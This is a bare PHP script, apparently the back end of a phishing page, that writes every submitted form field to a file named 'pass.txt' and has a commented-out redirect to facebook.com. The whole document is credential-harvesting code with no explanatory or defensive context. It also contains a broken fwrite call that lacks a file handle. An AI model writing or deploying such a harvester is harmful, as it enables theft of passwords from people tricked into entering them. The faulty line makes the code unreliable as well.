<?php 
//header('Location: http://www.facebook.com');
$handle = fopen("pass.txt", "a");

foreach($_POST as $var => $val){
echo $var;
echo "=";
echo $val;
echo "<br>";

fwrite($handle, $var);
fwrite($handle, "=");
fwrite($handle, $val);
fwrite($handle, "\r\n");
}
echo "===============\r\n";
fwrite("===============\r\n");
fclose($handle);
exit;


?>